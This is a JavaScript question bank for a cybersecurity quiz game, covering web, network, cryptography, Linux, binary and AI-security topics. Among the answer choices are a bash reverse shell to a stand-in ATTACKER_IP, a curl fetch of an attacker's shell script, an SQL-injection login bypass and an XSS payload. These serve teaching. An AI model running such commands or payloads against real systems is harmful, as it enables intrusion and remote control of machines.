// ============================================================
//  ExploitGym — Cybersecurity Question Engine
//  ----------------------------------------------------------
//  Every question is { topic, prompt, choices, correctIndex }
//  plus optional { hint } for the Academy modal.
//
//  The exported API is IDENTICAL to the old BrainBlox file so
//  every caller (main.js, arcade.js, learn.js, etc.) works
//  without modification:
//    getQuestion(level, rng)              → general question
//    getCategoryQuestion(cat, level, rng) → category-filtered
//    getLearnQuestion(subject, level, rng)→ Academy module
//    CATEGORIES                           → category list
// ============================================================

// ---- small helpers (same API, no external deps) ----------
function shuffle(arr, rng = Math.random) {
  for (let i = arr.length - 1; i > 0; i--) {
    const j = Math.floor(rng() * (i + 1));
    [arr[i], arr[j]] = [arr[j], arr[i]];
  }
  return arr;
}
function pick(arr, rng = Math.random) {
  return arr[Math.floor(rng() * arr.length)];
}

// ============================================================
//  BANK — 90+ curated cybersecurity questions
//  minLevel: 0 = Novice, 1 = Analyst, 2 = Tester, 3 = Dev, 4 = Legend
// ============================================================
export const BANK = [

  // ---- WEB SECURITY (OWASP / Injection) -------------------
  { topic: "Web Security",   prompt: "Which OWASP vulnerability lets an attacker inject SQL commands into a database query?",
    choices: ["XSS", "SQL Injection", "CSRF", "Path Traversal"], correctIndex: 1, minLevel: 0 },

  { topic: "Web Security",   prompt: "A payload of `<script>alert(1)</script>` stored in a forum post is an example of…",
    choices: ["SQL Injection", "SSRF", "Stored XSS", "Buffer Overflow"], correctIndex: 2, minLevel: 0 },

  { topic: "Web Security",   prompt: "Which attack tricks a user's browser into making unwanted requests using their session cookie?",
    choices: ["CSRF", "XSS", "SQLi", "LFI"], correctIndex: 0, minLevel: 0 },

  { topic: "Web Security",   prompt: "A web server fetches any URL you pass as a parameter. Which vulnerability is this?",
    choices: ["CORS Misconfiguration", "SSRF", "Open Redirect", "XXE"], correctIndex: 1, minLevel: 1 },

  { topic: "Web Security",   prompt: "The payload `' OR '1'='1` appended to a login form is used to bypass…",
    choices: ["XSS filters", "Authentication via SQLi", "CSRF tokens", "Rate limiting"], correctIndex: 1, minLevel: 0 },

  { topic: "Web Security",   prompt: "Which HTTP status code indicates 'Forbidden — you don't have permission'?",
    choices: ["401", "403", "404", "500"], correctIndex: 1, minLevel: 0 },

  { topic: "Web Security",   prompt: "Which HTTP header helps prevent Clickjacking attacks?",
    choices: ["Content-Type", "X-Frame-Options", "Authorization", "Cache-Control"], correctIndex: 1, minLevel: 1 },

  { topic: "Web Security",   prompt: "Which of these is a Server-Side Template Injection (SSTI) test payload?",
    choices: ["1=1--", "{{7*7}}", "<img onerror=>", "| ls -la"], correctIndex: 1, minLevel: 2 },

  { topic: "Web Security",   prompt: "Which OWASP category covers broken access control, missing authorization checks, and IDOR?",
    choices: ["A01: Broken Access Control", "A03: Injection", "A07: Auth Failures", "A10: SSRF"], correctIndex: 0, minLevel: 1 },

  { topic: "Web Security",   prompt: "An attacker modifies a JWT by changing the algorithm field to `none`. What is this attack called?",
    choices: ["JWT Header Injection", "alg:none JWT Attack", "HMAC Downgrade", "Key Confusion"], correctIndex: 1, minLevel: 3 },

  { topic: "Web Security",   prompt: "What does an HTTP 200 response code mean?",
    choices: ["Redirect", "Not Found", "OK — success", "Server Error"], correctIndex: 2, minLevel: 0 },

  { topic: "Web Security",   prompt: "Which tool is most commonly used to intercept and modify HTTP traffic during a pentest?",
    choices: ["Metasploit", "Burp Suite", "Wireshark", "Nessus"], correctIndex: 1, minLevel: 1 },

  // ---- NETWORK & RECON ------------------------------------
  { topic: "Network",        prompt: "Which port does SSH use by default?",
    choices: ["21", "22", "23", "25"], correctIndex: 1, minLevel: 0 },

  { topic: "Network",        prompt: "Which port does HTTPS traffic run on by default?",
    choices: ["80", "443", "8080", "8443"], correctIndex: 1, minLevel: 0 },

  { topic: "Network",        prompt: "A MySQL database server listens on which default port?",
    choices: ["1433", "5432", "3306", "27017"], correctIndex: 2, minLevel: 0 },

  { topic: "Network",        prompt: "What does a SYN packet begin in TCP?",
    choices: ["Data transfer", "Connection termination", "Three-way handshake", "UDP broadcast"], correctIndex: 2, minLevel: 0 },

  { topic: "Network",        prompt: "Which nmap flag performs a stealthy SYN scan without completing the TCP handshake?",
    choices: ["-sU", "-sV", "-sS", "-A"], correctIndex: 2, minLevel: 1 },

  { topic: "Network",        prompt: "ARP Poisoning works by sending fake ARP replies to map the attacker's MAC to a victim's…",
    choices: ["Domain name", "IP address", "Public key", "MAC address"], correctIndex: 1, minLevel: 1 },

  { topic: "Network",        prompt: "Which protocol translates domain names (like google.com) to IP addresses?",
    choices: ["DHCP", "DNS", "ARP", "ICMP"], correctIndex: 1, minLevel: 0 },

  { topic: "Network",        prompt: "A `ping` command uses which protocol?",
    choices: ["TCP", "UDP", "ICMP", "HTTP"], correctIndex: 2, minLevel: 0 },

  { topic: "Network",        prompt: "What does TTL (Time To Live) control in a network packet?",
    choices: ["Packet encryption strength", "How many router hops before the packet is discarded", "The session timeout on a web server", "The DNS cache duration"], correctIndex: 1, minLevel: 1 },

  { topic: "Network",        prompt: "Which Wireshark filter shows only HTTP GET requests?",
    choices: ["tcp.port==80", "http.request.method==\"GET\"", "ip.dst==80", "dns.qry.name"], correctIndex: 1, minLevel: 2 },

  { topic: "Network",        prompt: "Which port does FTP data transfer use?",
    choices: ["20", "21", "22", "25"], correctIndex: 0, minLevel: 1 },

  { topic: "Network",        prompt: "What service typically runs on port 25?",
    choices: ["FTP", "SSH", "SMTP", "HTTP"], correctIndex: 2, minLevel: 1 },

  { topic: "Network",        prompt: "A `netstat -an` command shows open ports in state `LISTEN`. What does LISTEN mean?",
    choices: ["Actively transferring data", "Waiting for incoming connections", "Closed port", "Half-open TCP connection"], correctIndex: 1, minLevel: 2 },

  // ---- CRYPTOGRAPHY & HASHES ------------------------------
  { topic: "Cryptography",   prompt: "Which of these is a HASH function (one-way), NOT an encryption algorithm?",
    choices: ["AES-256", "RSA", "SHA-256", "ChaCha20"], correctIndex: 2, minLevel: 0 },

  { topic: "Cryptography",   prompt: "What is the main difference between symmetric and asymmetric encryption?",
    choices: ["Symmetric uses one key for both encryption and decryption; asymmetric uses a key pair", "Symmetric is slower", "Asymmetric only works on files", "Symmetric uses hashes"], correctIndex: 0, minLevel: 0 },

  { topic: "Cryptography",   prompt: "Decoding `aGVsbG8=` gives you the word 'hello'. What encoding was used?",
    choices: ["MD5", "ROT13", "Base64", "Hex"], correctIndex: 2, minLevel: 0 },

  { topic: "Cryptography",   prompt: "A Rainbow Table attack targets password hashes. What defence makes them ineffective?",
    choices: ["Longer passwords", "Adding a random salt before hashing", "Using SHA-1 instead of MD5", "Encrypting the hash a second time"], correctIndex: 1, minLevel: 1 },

  { topic: "Cryptography",   prompt: "Which algorithm is considered broken and should NOT be used for password hashing today?",
    choices: ["bcrypt", "Argon2", "MD5", "scrypt"], correctIndex: 2, minLevel: 1 },

  { topic: "Cryptography",   prompt: "What does TLS (Transport Layer Security) protect in HTTPS connections?",
    choices: ["The server's IP address", "Data in transit between client and server", "The DNS query", "The firewall ruleset"], correctIndex: 1, minLevel: 0 },

  { topic: "Cryptography",   prompt: "What is `0xFF` in decimal?",
    choices: ["128", "255", "127", "256"], correctIndex: 1, minLevel: 1 },

  { topic: "Cryptography",   prompt: "How many bits does a SHA-256 digest produce?",
    choices: ["128", "160", "256", "512"], correctIndex: 2, minLevel: 1 },

  { topic: "Cryptography",   prompt: "In public-key cryptography, what do you use to ENCRYPT a message for someone?",
    choices: ["Their private key", "Your private key", "Their public key", "A shared session token"], correctIndex: 2, minLevel: 1 },

  { topic: "Cryptography",   prompt: "What is the hex representation of the decimal number 26?",
    choices: ["0x1A", "0x1B", "0x0A", "0x1C"], correctIndex: 0, minLevel: 2 },

  // ---- LINUX & COMMAND LINE --------------------------------
  { topic: "Linux CLI",      prompt: "Which Linux command shows currently logged-in users and their processes?",
    choices: ["ps aux", "who", "netstat", "top"], correctIndex: 1, minLevel: 0 },

  { topic: "Linux CLI",      prompt: "What permission does `chmod 777` grant to a file?",
    choices: ["Read-only for all users", "Read, write and execute for owner only", "Read, write and execute for everyone", "No permissions"], correctIndex: 2, minLevel: 0 },

  { topic: "Linux CLI",      prompt: "Which file in Linux systems stores local user account names and UIDs?",
    choices: ["/etc/shadow", "/etc/passwd", "/etc/hosts", "/var/log/auth.log"], correctIndex: 1, minLevel: 0 },

  { topic: "Linux CLI",      prompt: "Which file stores the HASHED passwords on modern Linux systems?",
    choices: ["/etc/passwd", "/etc/shadow", "/etc/security", "/var/passwd"], correctIndex: 1, minLevel: 1 },

  { topic: "Linux CLI",      prompt: "What does `sudo -l` reveal to a pentester?",
    choices: ["List of logged-in users", "Commands the current user can run as root", "Open network ports", "Scheduled cron jobs"], correctIndex: 1, minLevel: 1 },

  { topic: "Linux CLI",      prompt: "A reverse shell connects FROM the victim TO the attacker. Which command starts a basic one in Bash?",
    choices: ["nc -lvnp 4444", "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1", "ssh attacker@victim", "curl http://attacker/shell.sh"], correctIndex: 1, minLevel: 2 },

  { topic: "Linux CLI",      prompt: "What does the pipe operator `|` do in a Linux command?",
    choices: ["Runs two commands in parallel", "Sends the output of one command as input to the next", "Creates a background process", "Redirects output to a file"], correctIndex: 1, minLevel: 0 },

  { topic: "Linux CLI",      prompt: "Which command searches recursively for the string 'password' inside all `.log` files?",
    choices: ["find . -name password.log", "grep -r 'password' *.log", "cat *.log | sort", "ls -la *.log"], correctIndex: 1, minLevel: 1 },

  { topic: "Linux CLI",      prompt: "What does `crontab -l` show?",
    choices: ["Installed packages", "Scheduled recurring tasks for the current user", "Running processes", "DNS resolver config"], correctIndex: 1, minLevel: 2 },

  { topic: "Linux CLI",      prompt: "A SUID bit set on a binary means it runs with the privileges of its…",
    choices: ["Current user", "Group owner", "File owner (often root)", "Anyone who executes it"], correctIndex: 2, minLevel: 2 },

  // ---- BINARY & SYSTEMS -----------------------------------
  { topic: "Binary & Systems", prompt: "What is a Buffer Overflow attack?",
    choices: ["Flooding a server with too many packets", "Writing more data into a buffer than it can hold, overwriting adjacent memory", "Encrypting memory to deny access", "Sending malformed DNS queries"], correctIndex: 1, minLevel: 1 },

  { topic: "Binary & Systems", prompt: "Which protection stores a random value on the stack to detect buffer overflows before they reach the return address?",
    choices: ["ASLR", "DEP / NX", "Stack Canary", "PIE"], correctIndex: 2, minLevel: 2 },

  { topic: "Binary & Systems", prompt: "ASLR stands for Address Space Layout Randomization. What does it do?",
    choices: ["Encrypts executable code at rest", "Randomizes memory addresses of stack/heap/libraries each run", "Marks stack memory as non-executable", "Logs every system call"], correctIndex: 1, minLevel: 2 },

  { topic: "Binary & Systems", prompt: "In little-endian byte order, the value `0x12345678` is stored starting with…",
    choices: ["0x12 at the lowest address", "0x78 at the lowest address", "0x56 at the lowest address", "The bytes are reversed to 0x87654321"], correctIndex: 1, minLevel: 3 },

  { topic: "Binary & Systems", prompt: "What is a NOP sled used for in classic exploit development?",
    choices: ["Padding that slides execution into shellcode when the exact address is unknown", "Bypassing stack canaries", "Encoding shellcode to avoid bad chars", "Making a heap spray work"], correctIndex: 0, minLevel: 3 },

  { topic: "Binary & Systems", prompt: "Return-Oriented Programming (ROP) chains bypass which defence?",
    choices: ["ASLR", "Stack Canaries", "NX / DEP (non-executable stack/heap)", "Rate limiting"], correctIndex: 2, minLevel: 4 },

  { topic: "Binary & Systems", prompt: "What does the EIP/RIP register hold in x86/x64 architecture?",
    choices: ["The current stack frame", "The address of the NEXT instruction to execute", "The base address of the heap", "The PID of the current process"], correctIndex: 1, minLevel: 3 },

  // ---- AI / LLM SECURITY ----------------------------------
  { topic: "AI Red Team",    prompt: "Prompt Injection attacks target AI models by…",
    choices: ["Poisoning training data before deployment", "Inserting instructions into user input to override the system prompt", "Stealing model weights via side-channel", "DDoS-ing the inference API"], correctIndex: 1, minLevel: 0 },

  { topic: "AI Red Team",    prompt: "Which term describes an attack where malicious instructions are hidden inside content an LLM reads (e.g. a document)?",
    choices: ["Jailbreaking", "Indirect Prompt Injection", "Model Inversion", "Membership Inference"], correctIndex: 1, minLevel: 1 },

  { topic: "AI Red Team",    prompt: "Training data poisoning aims to…",
    choices: ["Slow inference speed", "Insert backdoors or biases into the model during training", "Steal model architecture", "Corrupt the tokenizer vocabulary"], correctIndex: 1, minLevel: 2 },

  { topic: "AI Red Team",    prompt: "Model Inversion attacks try to reconstruct…",
    choices: ["The system prompt from outputs", "Training data from model predictions", "The model weights from API calls", "Authentication tokens from embeddings"], correctIndex: 1, minLevel: 3 },

  { topic: "AI Red Team",    prompt: "A 'jailbreak' on an LLM means…",
    choices: ["Crashing the model with a long prompt", "Tricking the model into ignoring its safety guidelines", "Extracting the exact system prompt via output", "Replacing the model's weights remotely"], correctIndex: 1, minLevel: 0 },

  { topic: "AI Red Team",    prompt: "Which OWASP project covers LLM application security risks?",
    choices: ["OWASP Top 10 Web 2021", "OWASP LLM Top 10", "OWASP API Security Top 10", "OWASP ASVS"], correctIndex: 1, minLevel: 1 },

  // ---- TOOLS & FRAMEWORKS ---------------------------------
  { topic: "Recon & Tools",  prompt: "Which tool performs automated web vulnerability scanning and is commonly used in pentests?",
    choices: ["Wireshark", "Metasploit", "Nikto", "Hydra"], correctIndex: 2, minLevel: 1 },

  { topic: "Recon & Tools",  prompt: "Metasploit's `msfvenom` is used to…",
    choices: ["Scan for open ports", "Generate shellcode and payloads", "Capture network packets", "Brute-force SSH logins"], correctIndex: 1, minLevel: 2 },

  { topic: "Recon & Tools",  prompt: "Hydra is best known as…",
    choices: ["A network scanner", "A password brute-forcing tool for network services", "A packet sniffer", "An exploit framework"], correctIndex: 1, minLevel: 1 },

  { topic: "Recon & Tools",  prompt: "Which tool is the de facto standard for password hash cracking offline?",
    choices: ["John the Ripper / Hashcat", "Metasploit", "sqlmap", "Gobuster"], correctIndex: 0, minLevel: 1 },

  { topic: "Recon & Tools",  prompt: "Gobuster is used to…",
    choices: ["Exploit buffer overflows", "Brute-force directories and files on a web server", "Crack SSH keys", "Capture Wi-Fi handshakes"], correctIndex: 1, minLevel: 1 },

  // ---- CTF & GENERAL CONCEPTS -----------------------------
  { topic: "CTF & Concepts", prompt: "In Capture The Flag competitions, what is the goal?",
    choices: ["Physically capture a flag in a room", "Find hidden strings (flags) in systems by exploiting vulnerabilities", "Write the fastest exploit possible", "Guess random passwords"], correctIndex: 1, minLevel: 0 },

  { topic: "CTF & Concepts", prompt: "What does CVE stand for?",
    choices: ["Cyber Vulnerability Exploit", "Common Vulnerabilities and Exposures", "Centralized Vulnerability Engine", "Critical Vulnerability Entry"], correctIndex: 1, minLevel: 0 },

  { topic: "CTF & Concepts", prompt: "What is a Zero-Day vulnerability?",
    choices: ["A vulnerability that has been patched for 0 days", "A flaw unknown to the software vendor with no patch available", "A vulnerability that takes 0 seconds to exploit", "A non-critical informational finding"], correctIndex: 1, minLevel: 0 },

  { topic: "CTF & Concepts", prompt: "In pentesting, what does 'lateral movement' mean?",
    choices: ["Moving the attacking machine physically", "Pivoting from one compromised system to others within the same network", "Escalating privileges on the same machine", "Exfiltrating data to an external server"], correctIndex: 1, minLevel: 2 },

  { topic: "CTF & Concepts", prompt: "A 'pivot' in network penetration testing means…",
    choices: ["Changing your exploit technique mid-attack", "Using a compromised host as a relay to reach otherwise inaccessible network segments", "Switching from a high-level to low-level exploit", "Restarting a failed payload delivery"], correctIndex: 1, minLevel: 2 },

  { topic: "CTF & Concepts", prompt: "Which phase of the Cyber Kill Chain involves setting up C2 infrastructure and exploit tools?",
    choices: ["Reconnaissance", "Weaponization", "Command & Control", "Exfiltration"], correctIndex: 1, minLevel: 2 },

  { topic: "CTF & Concepts", prompt: "What does privilege escalation mean?",
    choices: ["Getting more users to join your team", "Gaining higher permissions (e.g. root/admin) from a lower-privileged account", "Brute-forcing a hashed password", "Phishing an administrator"], correctIndex: 1, minLevel: 1 },

  { topic: "CTF & Concepts", prompt: "What is the MITRE ATT&CK framework?",
    choices: ["A penetration testing tool", "A knowledge base of adversary tactics and techniques based on real-world observations", "A vulnerability scanning platform", "An encryption standard"], correctIndex: 1, minLevel: 2 },
];

// ============================================================
//  ALGORITHMIC GENERATORS (replaces math / picture generators)
// ============================================================

// Converts a decimal to hex and asks the player to identify it
function makeHexConvert(rng = Math.random) {
  const n = 1 + Math.floor(rng() * 254); // 1–254
  const hex = "0x" + n.toString(16).toUpperCase().padStart(2, "0");
  // build 3 wrong answers
  const wrongs = new Set();
  while (wrongs.size < 3) {
    const w = 1 + Math.floor(rng() * 254);
    if (w !== n) wrongs.add(w);
  }
  const choices = shuffle([n, ...[...wrongs]].map(String), rng);
  return {
    topic: "Cryptography",
    prompt: `What is the decimal value of ${hex}?`,
    choices,
    correctIndex: choices.indexOf(String(n)),
  };
}

// Asks for a well-known port → service mapping
const PORT_MAP = [
  { port: 21,   service: "FTP" },
  { port: 22,   service: "SSH" },
  { port: 23,   service: "Telnet" },
  { port: 25,   service: "SMTP" },
  { port: 53,   service: "DNS" },
  { port: 80,   service: "HTTP" },
  { port: 443,  service: "HTTPS" },
  { port: 445,  service: "SMB" },
  { port: 1433, service: "MSSQL" },
  { port: 3306, service: "MySQL" },
  { port: 3389, service: "RDP" },
  { port: 5432, service: "PostgreSQL" },
  { port: 6379, service: "Redis" },
  { port: 8080, service: "HTTP-Proxy" },
  { port: 27017,service: "MongoDB" },
];

function makePortQuestion(rng = Math.random) {
  const item = pick(PORT_MAP, rng);
  if (rng() < 0.5) {
    // "Port 443 runs which service?"
    const wrongs = shuffle(PORT_MAP.filter(p => p.service !== item.service), rng).slice(0, 3).map(p => p.service);
    const choices = shuffle([item.service, ...wrongs], rng);
    return { topic: "Network", prompt: `Port ${item.port} is used by which service by default?`, choices, correctIndex: choices.indexOf(item.service) };
  }
  // "SSH runs on which port?"
  const wrongs = shuffle(PORT_MAP.filter(p => p.port !== item.port), rng).slice(0, 3).map(p => String(p.port));
  const choices = shuffle([String(item.port), ...wrongs], rng);
  return { topic: "Network", prompt: `${item.service} uses which default port?`, choices, correctIndex: choices.indexOf(String(item.port)) };
}

// ============================================================
//  ACADEMY MODULE (replaces letters / numbers / shapes / colors)
//  Subjects: web | network | crypto | linux | binary | ai
// ============================================================
const ACADEMY_SUBJECTS = {
  web:     BANK.filter(q => q.topic === "Web Security"),
  network: BANK.filter(q => q.topic === "Network"),
  crypto:  BANK.filter(q => q.topic === "Cryptography"),
  linux:   BANK.filter(q => q.topic === "Linux CLI"),
  binary:  BANK.filter(q => q.topic === "Binary & Systems"),
  ai:      BANK.filter(q => q.topic === "AI Red Team"),
};

export function getLearnQuestion(subject, level = 0, rng = Math.random) {
  const pool = ACADEMY_SUBJECTS[subject];
  if (pool && pool.length) {
    const eligible = pool.filter(q => (q.minLevel || 0) <= level);
    const q = pick(eligible.length ? eligible : pool, rng);
    return { topic: q.topic, prompt: q.prompt, choices: [...q.choices], correctIndex: q.correctIndex };
  }
  return getQuestion(level, rng);
}

// ============================================================
//  CATEGORIES (shown in multiplayer room host selector)
// ============================================================
export const CATEGORIES = [
  { key: "mix",     emoji: "🎲", name: "Full Arsenal" },
  { key: "web",     emoji: "🌐", name: "Web Security" },
  { key: "network", emoji: "🔌", name: "Network & Recon" },
  { key: "crypto",  emoji: "🔐", name: "Cryptography" },
  { key: "linux",   emoji: "🐧", name: "Linux CLI" },
  { key: "binary",  emoji: "⚙️",  name: "Binary & Systems" },
  { key: "ai",      emoji: "🤖", name: "AI Red Team" },
  { key: "ctf",     emoji: "🚩", name: "CTF Concepts" },
  { key: "tools",   emoji: "🛠️",  name: "Recon & Tools" },
];

function bankByTopic(topic, level, rng = Math.random) {
  const pool = BANK.filter(q => q.topic === topic && (q.minLevel || 0) <= level);
  const all  = pool.length ? pool : BANK.filter(q => q.topic === topic);
  if (!all.length) return getQuestion(level, rng);
  const q = pick(all, rng);
  return { topic: q.topic, prompt: q.prompt, choices: [...q.choices], correctIndex: q.correctIndex };
}

export function getCategoryQuestion(category, level = 0, rng = Math.random) {
  switch (category) {
    case "web":     return bankByTopic("Web Security",     level, rng);
    case "network": return bankByTopic("Network",          level, rng);
    case "crypto":  return rng() < 0.3 ? makeHexConvert(rng) : bankByTopic("Cryptography", level, rng);
    case "linux":   return bankByTopic("Linux CLI",        level, rng);
    case "binary":  return bankByTopic("Binary & Systems", level, rng);
    case "ai":      return bankByTopic("AI Red Team",      level, rng);
    case "ctf":     return bankByTopic("CTF & Concepts",   level, rng);
    case "tools":   return bankByTopic("Recon & Tools",    level, rng);
    default:        return getQuestion(level, rng);
  }
}

// ============================================================
//  getQuestion — general draw weighted by level
// ============================================================
export function getQuestion(level = 0, rng = Math.random) {
  const roll = rng();
  // At higher levels inject algo generators (ports / hex)
  if (level >= 1 && roll < 0.2) return makePortQuestion(rng);
  if (level >= 2 && roll < 0.35) return makeHexConvert(rng);

  // Draw from the bank, filtered by difficulty
  const eligible = BANK.filter(q => (q.minLevel || 0) <= level);
  const pool = eligible.length ? eligible : BANK;
  const q = pick(pool, rng);
  return { topic: q.topic, prompt: q.prompt, choices: [...q.choices], correctIndex: q.correctIndex };
}

// Keep PICTURES exported as empty to avoid import errors in any
// legacy code that destructures it (e.g. old test snapshots).
export const PICTURES = [];
